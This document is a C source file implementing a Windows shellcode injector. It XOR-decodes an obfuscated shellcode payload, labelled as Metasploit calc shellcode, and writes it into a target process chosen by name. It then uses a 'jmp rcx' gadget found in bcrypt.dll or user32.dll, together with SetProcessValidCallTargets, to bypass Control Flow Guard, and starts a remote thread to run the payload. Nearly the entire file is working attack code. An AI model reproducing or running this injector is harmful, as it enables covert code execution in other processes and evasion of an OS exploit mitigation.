/*
*
* Found a gadget in bcrypt.dll that can bypass CFG.
* Theoretically all processes which have bcrypt.dll
* can be targeted.
*
*/

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <memoryapi.h>
#include <Tlhelp32.h>
#include <Shlwapi.h>

// comment out to suppress output
//
#define _DBG

#ifdef _DBG
#define DEBUG_PRINT(x, ...) printf(x, ##__VA_ARGS__)
#define _INT getchar()
#else
#define DEBUG_PRINT(x, ...)
#define _INT
#endif

// pick windows version
// lazy, didn't bother getting the version in code

// Win 1809
//
#define _WIN_1809

// Win 1909
//\
#define _WIN_1909

// Win 21H1
//\
#define _WIN_21H1

// Win 22H2
//\
#define _WIN_22H2

// Win 11
//\
#define _WIN_11_22H2

#ifdef _WIN_1809
#define ROP_RANGE 0x1000 * 100
#define ROP_DLL "bcrypt.dll"
#define ROP_BIT 0x3					// this is the last bit of the gadget's address
#endif

#ifdef _WIN_1909
#define ROP_RANGE 0x1000 * 100
#define ROP_DLL "bcryptprimitives.dll"
#define ROP_BIT 0x0
#endif

#ifdef _WIN_21H1
#define ROP_RANGE 0x1000 * 30
#define ROP_DLL "user32.dll"
#define ROP_BIT 0x0
#endif

#ifdef _WIN_22H2
#define ROP_RANGE 0x1000 * 30
#define ROP_DLL "user32.dll"
#define ROP_BIT 0x0
#endif

#ifdef _WIN_11_22H2
#define ROP_RANGE 0x1000 * 30
#define ROP_DLL "bcrypt.dll"
#define ROP_BIT 0x0
#endif

unsigned char KEY[] = { 0xF2, 0x17, 0x42, 0xB9, 0x61, 0x75, 0x82, 0x2E, 0xA5, 0xFD, 0x2C, 0xA8, 0x0A };

//x64 calc metasploit shellcode 
unsigned char payload[] = {
	0x62,0x87,0xd2,0x29,0xf1,0x89,0xca,0xad,0x41,0x0d,0xc4,0x68,0x0a,0xf2,0x17,0x03,0xe8,0x20,0x25,0xd0,0x7f,0xf3,0xb5,0x1d,0x7a,0x6f,0xba,0x9c,0x10,0xd9,0x29,0xfe,0xd0,0x36,0xed,0x76,0x7e,0x88,0x42,0x79,0x65,0x12,0xf1,0x6e,0xc2,0xc8,0x64,0xe8,0xcc,0xe5,0xe0,0x3b,0x32,0xbb,0x7e,0xd8,0x1d,0x77,0xae,0x0e,0xe4,0x3c,0xe5,0xa5,0x4b,0xf3,0xd6,0xa0,0x54,0x33,0x34,0xd3,0x66,0x2e,0xaf,0x0c,0x23,0x48,0xce,0x5f,0x43,0x69,0xea,0xf5,0x0a,0x2e,0xa5,0xfd,0x64,0x2d,0xca,0x86,0x70,0x0a,0xb8,0xb1,0x25,0x09,0x66,0xbd,0xb9,0xa7,0xe8,0x2a,0xbb,0x16,0x92,0x5a,0x37,0x3d,0x7d,0xe7,0xe4,0x76,0x18,0x20,0x42,0xf3,0xc1,0x0f,0x88,0xa8,0x3d,0xb3,0xee,0x09,0xbc,0xed,0x61,0x07,0xb3,0x16,0x83,0x81,0x81,0x00,0x73,0x62,0xa6,0xb1,0x08,0xa0,0x4f,0xcb,0xc6,0x37,0x61,0x39,0x31,0x09,0x6e,0x81,0xb4,0x2d,0x78,0x6c,0xb3,0x9c,0x4e,0xf1,0x25,0xfe,0xc2,0x32,0xec,0xfc,0xfc,0xe9,0x81,0xf6,0x9f,0x0a,0xb8,0xb1,0x34,0xda,0x6f,0xfd,0xa3,0x75,0xf2,0x4b,0xaa,0x56,0x1b,0xf8,0x3b,0x3d,0x01,0xc2,0x85,0xbc,0x7e,0x57,0xea,0xaa,0x56,0x1b,0xe3,0x29,0xfe,0x90,0xc7,0xf2,0x02,0xd3,0x57,0x57,0xba,0xad,0x43,0xb9,0x61,0x75,0x82,0x2e,0xa5,0xfd,0x64,0x25,0x87,0xf3,0x16,0x42,0xb9,0x20,0xcf,0xb3,0xa5,0xca,0x7a,0xd3,0x7d,0xb1,0x12,0x0a,0x68,0xb3,0x20,0xcf,0x24,0xbb,0x18,0x60,0xd3,0x7d,0x42,0x71,0xd3,0x6a,0x85,0x67,0x09,0x88,0xae,0x5e,0x1d,0x59,0xad,0xb1,0xb5,0x04,0x30,0xd6,0x0b,0x75,0xdb,0x6f,0x2c,0x27,0xd3,0x7d,0x69,0x93,0x7b,0x21,0x97,0x04,0x0d,0xe7,0x2e
};

VOID XOR(IN PBYTE pPayload, IN SIZE_T sPayloadSize, IN PBYTE bKey, IN SIZE_T sKeySize)
{
	for (SIZE_T i = 0; i < sPayloadSize; i++)
	{
		pPayload[i] = pPayload[i] ^ bKey[i % sKeySize];
	}
}

// get target process handle using snapshot method
BOOL GetRemoteProcHandle(_In_ LPWSTR szProcessName, _Out_ DWORD* dwProcId, _Out_ HANDLE* hProc)
{
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 stProc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (INVALID_HANDLE_VALUE == hSnapShot)
	{
		DEBUG_PRINT("[*]CreateToolhelp32Snapshot failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	if (!Process32First(hSnapShot, &stProc))
	{
		DEBUG_PRINT("[-]Process32First failed with error: 0x%.8x\n", GetLastError());
		goto _endfunc;
	}

	do
	{
		WCHAR lowerName[MAX_PATH * 2];

		if (stProc.szExeFile)
		{
			DWORD dwSize = lstrlenW(stProc.szExeFile);
			DWORD i = 0;

			RtlSecureZeroMemory(lowerName, MAX_PATH * 2);

			if (dwSize < MAX_PATH * 2)
			{
				for (; i < dwSize; i++)
					lowerName[i] = (WCHAR)tolower(stProc.szExeFile[i]);

				lowerName[i++] = '\0';
			}
		}

		if (0 == wcscmp(lowerName, szProcessName))
		{
			*dwProcId = stProc.th32ProcessID;
			*hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, stProc.th32ProcessID);
			if (NULL == *hProc)
				DEBUG_PRINT("[-]OpenProcess failed with error: 0x%.8x\n", GetLastError());
			break;
		}
	} while (Process32Next(hSnapShot, &stProc));

_endfunc:
	if (NULL != hSnapShot)
		CloseHandle(hSnapShot);
	if (NULL == *dwProcId || NULL == *hProc)
		return FALSE;

	return TRUE;
}

// inject shellcode into remote process
BOOL InjectRemoteProc(_In_ HANDLE hProc, _In_ PBYTE pShellcode, _In_ SIZE_T sShellcod, _Out_ PVOID* ppAddr)
{
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	*ppAddr = VirtualAllocEx(hProc, NULL, sShellcod, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (NULL == *ppAddr)
	{
		DEBUG_PRINT("[-]VirtualAllocEx failed with error: %d\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[+]Payload buffer address @ ==========> 0x%p\n", *ppAddr);

	DEBUG_PRINT("[*]Press <Enter> to write payload ..");
	_INT;

	if (!WriteProcessMemory(hProc, *ppAddr, pShellcode, sShellcod, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sShellcod)
	{
		DEBUG_PRINT("[-]WriteProcessMemory failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[*]Done ... %d bytes of payload written ...\n", sNumberOfBytesWritten);

	if (!VirtualProtectEx(hProc, *ppAddr, sShellcod, PAGE_EXECUTE_READWRITE, &dwOldProtection))
	{
		DEBUG_PRINT("[-]VirtualProtectEx failed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

// perform thread hijacking
BOOL RopCfgFree(_In_ HANDLE hProc, _In_ PVOID pAddr, _In_ LPWSTR szProcessName)
{
	PVOID pLegitBase = NULL;
	PVOID rop = NULL;
	PVOID tmp = NULL;
	//PVOID lpParam = NULL;	// compile according to windows version
	PVOID hModBase = NULL;
	DWORD dwThrdId = 0x0;
	HANDLE hThrd = INVALID_HANDLE_VALUE;
	HMODULE hMods[1024] = { 0x0 };
	DWORD dwModSize = 0x0;
	DWORD cbNeeded = 0x0;

	// find a legit image to rop, get base address
	pLegitBase = (PVOID)LoadLibraryA(ROP_DLL);

	if (NULL == pLegitBase)
	{
		DEBUG_PRINT("[-]Failed to load image ...\n");
		return FALSE;
	}

	for (DWORD i = 0; i + 1 < ROP_RANGE && rop == NULL; i++)
	{
		if (((PCHAR)pLegitBase)[i] == '\xff' && ((PCHAR)pLegitBase)[i + 1] == '\xe1')
		{
			tmp = (PVOID)((PCHAR)pLegitBase + i);
			DEBUG_PRINT("[*]************: 0x%p\n", tmp);
			DEBUG_PRINT("[*]************: %x\n", (ULONG_PTR)tmp & 0xF);
		}
		DWORD delta = (ULONG_PTR)tmp & 0xF;
		if (delta == ROP_BIT)
			rop = tmp;
		else
			continue;
	}

	if (NULL == rop)
	{
		DEBUG_PRINT("[-]Cannot find rop gadget ...\n");
		return FALSE;
	}

	DEBUG_PRINT("[+]ROP jmp rcx found @ ===========> 0x%p\n", rop);

	DEBUG_PRINT("[*]Press <Enter> to disable CFG on gadget ...");
	_INT;

	FARPROC SetProcessValidCallTargets = GetProcAddress(GetModuleHandleW(L"kernelbase.dll"), "SetProcessValidCallTargets");
	if (NULL == SetProcessValidCallTargets)
	{
		DEBUG_PRINT("[-]Faile to revolve SetProcessValidCallTargets function ...\n");
		return FALSE;
	}

	MEMORY_BASIC_INFORMATION mbi = { 0x0 };

	VirtualQuery(rop, &mbi, sizeof(mbi));

	DEBUG_PRINT("[*]DLL allocation base @ =========> 0x%p\n", mbi.AllocationBase);
	DEBUG_PRINT("[*]DLL region size %d\n", mbi.RegionSize);

	CFG_CALL_TARGET_INFO callTargets[1] = { 0x0 };

	callTargets[0].Flags = CFG_CALL_TARGET_VALID;
    // offset must be aligned
	callTargets[0].Offset = (ULONG_PTR)(rop) & 0xFFFFFFFFFFFFFFF0 - (ULONG_PTR)(mbi.AllocationBase);

	DEBUG_PRINT("[*]rop & 0xFFFFFFFFFFFFFFF0: 0x%x\n", (ULONG_PTR)rop & 0xFFFFFFFFFFFFFFF0);
	DEBUG_PRINT("[*]offset: 0x%x\n", ((ULONG_PTR)(rop) & 0xFFFFFFFFFFFFFFF0) - (ULONG_PTR)(mbi.AllocationBase));

	if (!SetProcessValidCallTargets(
		hProc,
		mbi.AllocationBase,         // gadget DLL base address
		mbi.RegionSize,             // gadget DLL size
		0x1,                        // only one address to free from CFG
		&callTargets))
	{
		DEBUG_PRINT("[-]Failed to call SetProcessValidCallTargets : 0x%.8x\n", GetLastError());
	}

	DEBUG_PRINT("[*]Done ...\n");

	DEBUG_PRINT("[*]Press <Enter> to create thread ...");
	_INT;

	if (NULL == (hThrd = CreateRemoteThread(
		hProc,
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)((PVOID)((ULONG_PTR)rop & 0xFFFFFFFFFFFFFFF0)),     // start with the aligned address
		pAddr,
		NULL,
		&dwThrdId)))
	{
		DEBUG_PRINT("[-]Create thread fialed with error: 0x%.8x\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("[*]Thread created with ID: %d\n", dwThrdId);

	DEBUG_PRINT("[*]Check ...");
	_INT;

	return TRUE;
}

int wmain(int argc, wchar_t** argv)
{
	HANDLE hProc = NULL;
	DWORD dwProcId = NULL;
	PVOID pAddr = NULL;

	if (argc < 2)
	{
		DEBUG_PRINT("[-]Usage: \"%ws\" <Process Name> \n", argv[0]);
		return -1;
	}

	DEBUG_PRINT("[*]Trageting process: \"%ws\" ...\n", argv[1]);

	if (!GetRemoteProcHandle(argv[1], &dwProcId, &hProc))
	{
		DEBUG_PRINT("[-]Process not found ...\n");
		return -1;
	}

	DEBUG_PRINT("[+]Found target process @ ==========> %d\n", dwProcId);

	DEBUG_PRINT("[*]Inject shellcode ...\n");

	XOR(payload, sizeof(payload), KEY, sizeof(KEY));

	if (!InjectRemoteProc(hProc, payload, sizeof(payload), &pAddr))
	{
		DEBUG_PRINT("[-]Inject shellcode failed ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]RopCfgFree execute ... \n");

	if (!RopCfgFree(hProc, pAddr, argv[1]))
	{
		DEBUG_PRINT("[-]RopCfgFree execute failed ...\n");
		return -1;
	}

	DEBUG_PRINT("[*]DONE ...\n");

	CloseHandle(hProc);

	DEBUG_PRINT("[*]Press <Enter> to quit ...");
	_INT;

	return 0;
}

